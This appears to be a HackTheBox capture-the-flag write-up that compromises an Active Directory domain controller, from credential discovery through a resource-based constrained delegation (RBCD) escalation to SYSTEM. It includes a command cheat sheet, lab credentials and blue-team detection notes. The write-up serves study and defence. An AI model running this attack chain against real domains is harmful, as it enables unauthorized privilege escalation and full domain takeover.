# 🖥️ HTB Support — Full Attack Walkthrough

> **Machine:** Support | **OS:** Windows Server 2022 | **Difficulty:** Easy
> **Domain:** `support.htb` | **DC IP:** `10.129.35.205`

---

## 🗺️ Attack Path Summary

```
SMB Enum → Reverse Engineer Binary → LDAP Creds
→ LDAP Dump → Password in "info" field → WinRM as support
→ MachineAccountQuota = 10 → Add Fake Computer
→ Set RBCD on DC → S4U2Proxy → Impersonate Administrator
→ PSExec as NT AUTHORITY\SYSTEM
```

---

## 📌 Phase 1 — Recon

### Nmap

```bash
nmap -sCV -T4 -vv 10.129.35.205 -oN nmap.txt
```

**Key Open Ports:**

| Port | Service | Note |
|------|---------|------|
| 53 | DNS | Simple DNS Plus |
| 88 | Kerberos | Windows KDC |
| 389 / 3268 | LDAP | Active Directory |
| 445 | SMB | No anonymous |
| 5985 | WinRM | (implicit from Evil-WinRM) |

**Domain discovered:** `support.htb` | **Hostname:** `DC`

---

## 📌 Phase 2 — Initial Foothold

### Step 1: SMB Enumeration

```bash
smbclient -L //10.129.35.205 -N
smbclient //10.129.35.205/support-tools -N
```

> 💡 Found `UserInfo.exe.zip` in a share. Downloaded and reverse-engineered it.

---

### Step 2: Extract Hardcoded LDAP Credentials from Binary

Reverse the binary (dnSpy / strings / ILSpy). Found:

```
Username: ldap@support.htb
Password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

---

### Step 3: LDAP Enumeration

```bash
ldapsearch -H ldap://10.129.35.205 \
  -x \
  -D "ldap@support.htb" \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b "DC=support,DC=htb" \
  "(objectClass=user)"
```

> 🔑 **Critical Finding:** The `support` user has a password stored in the `info` LDAP attribute:
> ```
> info: Ironside47pleasure40Watchful
> ```

---

### Step 4: WinRM Shell as `support`

```bash
evil-winrm -i 10.129.35.205 -u support -p 'Ironside47pleasure40Watchful'
```

✅ Got shell as `support\support`

---

## 📌 Phase 3 — Domain Enumeration (PowerView)

```powershell
# Upload and import
upload PowerView.ps1
Import-Module .\PowerView.ps1

# Core enumeration
Get-DomainUser
Get-DomainGroup
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainComputer

# Attack surface checks
Get-DomainUser -PreauthNotRequired       # ASREPRoast candidates
Get-DomainUser -SPN                      # Kerberoast candidates
Get-DomainUser -TrustedToAuth            # Constrained delegation
Get-DomainComputer -TrustedToAuth        # Computer constrained delegation
Get-DomainUser -AllowDelegation          # Unconstrained delegation

# Machine Account Quota — KEY CHECK
Get-DomainObject -Identity "DC=support,DC=htb" -Properties ms-DS-MachineAccountQuota
```

> 🎯 **Key Finding:** `ms-DS-MachineAccountQuota = 10`
> Any domain user can add up to 10 machine accounts. This enables the RBCD attack.

---

## 📌 Phase 4 — Privilege Escalation via RBCD

> **Why this works:**
> `support` user has `GenericAll` on the DC (via `Shared Support Accounts` group).
> `MachineAccountQuota = 10` → we can create a fake computer account.
> We set the DC to allow our fake computer to delegate → impersonate Administrator.

---

### Step 1: Add Fake Machine Account

```powershell
upload Powermad.ps1
Import-Module .\Powermad.ps1

New-MachineAccount -MachineAccount HACKER-PC \
  -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)

# Verify
Get-ADComputer -Identity "HACKER-PC"
# SID: S-1-5-21-1677581083-3380853377-188903654-6102
```

---

### Step 2: Set RBCD — Allow HACKER-PC to Delegate to DC

```powershell
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount HACKER-PC$

# Verify RBCD is set
Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
```

---

### Step 3: Get NT Hash of HACKER-PC

```powershell
upload Rubeus.exe

.\Rubeus.exe hash /password:Password123 /user:HACKER-PC$ /domain:support.htb
```

**Output:**
```
rc4_hmac             : 58A478135A93AC3BF058A5EA0E8FDB71
aes256_cts_hmac_sha1 : 55E86B35B76AF2990676C818BE5697F3...
```

---

### Step 4: S4U2Self + S4U2Proxy — Get Admin Ticket

```powershell
.\Rubeus.exe s4u \
  /user:HACKER-PC$ \
  /rc4:58A478135A93AC3BF058A5EA0E8FDB71 \
  /impersonateuser:Administrator \
  /msdsspn:cifs/dc.support.htb \
  /domain:support.htb \
  /dc:dc.support.htb \
  /ptt
```

**Verify ticket is cached:**
```powershell
klist
# Client: Administrator @ SUPPORT.HTB
# Server: cifs/dc.support.htb @ SUPPORT.HTB
```

---

## 📌 Phase 5 — Domain Compromise

### On Kali — Convert Ticket & PSExec

```bash
# Convert kirbi → ccache
impacket-ticketConverter administrator.kirbi administrator.ccache

# Set env var
export KRB5CCNAME=$(pwd)/administrator.ccache

# PSExec as SYSTEM
impacket-psexec dc.support.htb -k -no-pass
```

```
C:\Windows\system32> whoami
nt authority\system
```

### Grab the Flag

```
C:\Users\Administrator\Desktop> type root.txt
ad7ac69b79070f914458ac67029d855c
```

---

## 🛠️ Quick Command Reference

| Purpose | Command |
|---------|---------|
| Nmap full scan | `nmap -sCV -T4 -vv <IP> -oN nmap.txt` |
| LDAP dump | `ldapsearch -H ldap://<IP> -x -D "user@domain" -w 'pass' -b "DC=..." "(objectClass=user)"` |
| WinRM shell | `evil-winrm -i <IP> -u <user> -p '<pass>'` |
| Check MachineAccountQuota | `Get-DomainObject -Identity "DC=..." -Properties ms-DS-MachineAccountQuota` |
| Add machine account | `New-MachineAccount -MachineAccount <name> -Password $(ConvertTo-SecureString '<pass>' -AsPlainText -Force)` |
| Set RBCD | `Set-ADComputer -Identity <target> -PrincipalsAllowedToDelegateToAccount <fake>$` |
| Get NT hash | `.\Rubeus.exe hash /password:<pass> /user:<user>$ /domain:<domain>` |
| S4U attack | `.\Rubeus.exe s4u /user:<fake>$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:cifs/<dc> /domain:<domain> /dc:<dc> /ptt` |
| Convert ticket | `impacket-ticketConverter <file>.kirbi <file>.ccache` |
| Use ticket | `export KRB5CCNAME=$(pwd)/<file>.ccache` |
| PSExec with ticket | `impacket-psexec <target> -k -no-pass` |

---

## 🔵 Detection Notes (Blue Team)

| Attack Step | Windows Event ID | What to Look For |
|-------------|-----------------|-----------------|
| LDAP credential enum | 4624 (Type 3) | Logon from unusual external IP |
| Password in `info` attribute | LDAP audit | `info` / `description` field contains credential-like strings |
| Machine account creation | **4741** | Computer account created by non-admin user |
| RBCD modification on DC | **4742** | `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute changed |
| S4U Kerberos abuse | **4769** | Unusual service ticket request patterns |
| PSExec as SYSTEM | 7045 + 4624 | New service installed + privileged logon |

---

## 🧠 Key Lessons

- **Passwords should never be in LDAP attributes** (`info`, `description`, `comment`)
- **Hardcoded creds in binaries** are a critical misconfiguration — always decompile/analyze downloaded tools
- **MachineAccountQuota > 0** combined with any `GenericWrite`/`WriteDACL` on a computer object = RBCD attack path
- **RBCD requires:** Create computer → Set delegation → S4U2Self → S4U2Proxy → Pass the Ticket
- **BloodHound** would have shown the `Shared Support Accounts → GenericAll → DC` path instantly

---

*Writeup by: shuubhi123 | Date: April 2026 | Platform: HackTheBox*
